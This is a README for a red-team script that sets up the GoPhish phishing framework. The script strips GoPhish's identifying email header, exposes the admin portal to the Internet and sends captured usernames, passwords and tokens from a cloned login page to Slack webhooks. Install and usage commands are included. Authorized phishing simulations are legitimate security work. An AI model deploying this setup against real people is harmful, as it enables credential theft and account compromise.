# GoPhish Slack Phishing Credential Harvester

GoPhish Slack Phishing Credential Harvester is a penetration testing and red teaming script that installs GoPhish, generates an SSL certificate, and enables Slack integration.

## Main Features

 - Modifies GoPhish source code to change the default GoPhish email header
 - Modifies GoPhish source code to allow the GoPhish admin portal to be Internet accessible
 - Creates a GoPhish service for quick and easy starting and stopping
 - Optionally uses a tmux session instead of creating a service
 - Optionally generates an SSL certificate
 - Optionally modifies GoPhish source code to serve the phishing landing page over https
 - Optionally modifies GoPhish source code to add Slack integration
 - Optionally posts data into Slack using bold format instead of code block format

## Installation

Clone the GitHub repository and allow the script to be executed
```
git clone https://github.com/centralinfosec/GoPhish-Slack-Phishing-Credential-Harvester /opt/Central-InfoSec/GoPhish-Slack-Phishing-Credential-Harvester
chmod +x /opt/Central-InfoSec/GoPhish-Slack-Phishing-Credential-Harvester/gophish-slack.sh
```

## Usage

 - Create two Slack channels
   - One is only for the login data that is submitted
   - One is for the detailed data including details on opened emails, clicked links, and submitted data
 - Clone a login page with the username field named "username", password field named "password", and token field named "token"
 - Run the following command with URLs to the two slack channels:
```
/opt/Central-InfoSec/GoPhish-Slack-Phishing-Credential-Harvester/gophish-slack.sh https phishingdomain.com SlackLoginDataWebhookUrl SlackDetailedDataWebhookUrl
```

### Sample Usage

Compile GoPhish without the GoPhish email header
```
gophish-slack.sh http 1.2.3.4
gophish-slack.sh http phishingdomain.com
```

Compile GoPhish without the GoPhish email header and generate an SSL certificate
```
gophish-slack.sh https phishingdomain.com
```

Compile GoPhish without the GoPhish email header and add Slack integration
```
gophish-slack.sh http 1.2.3.4 https://hooks.slack.com/services/abc/def/ghi https://hooks.slack.com/services/jkl/mno/pqr
gophish-slack.sh http phishingdomain.com https://hooks.slack.com/services/abc/def/ghi https://hooks.slack.com/services/jkl/mno/pqr
```

Compile GoPhish without the GoPhish email header, generate an SSL certificate, and add Slack integration
```
gophish-slack.sh https phishingdomain.com https://hooks.slack.com/services/abc/def/ghi https://hooks.slack.com/services/jkl/mno/pqr
```

## Starting & Stopping GoPhish

Start the GoPhish service
```
service gophish start
```

Stop the GoPhish service
```
service gophish stop
```

## Example Screenshots

### GoPhish Generic Phishing Login Page

![ExampleOutput-PhishingLoginPage](screenshot-phishing-login-page.png?raw=true "ExampleOutput-PhishingLoginPage")

### Slack Phishing Logins Bold Format

![ExampleOutput-SlackLogins](screenshot-slack-phishing-logins-bold.png?raw=true "ExampleOutput-SlackLogins")

### Slack Phishing Details Bold Format

![ExampleOutput-SlackDetails](screenshot-slack-phishing-details-bold.png?raw=true "ExampleOutput-SlackDetails")

### Slack Phishing Logins Code Block Format

![ExampleOutput-SlackLogins](screenshot-slack-phishing-logins-codeblock.png?raw=true "ExampleOutput-SlackLogins")

### Slack Phishing Details Code Block Format

![ExampleOutput-SlackDetails](screenshot-slack-phishing-details-codeblock.png?raw=true "ExampleOutput-SlackDetails")
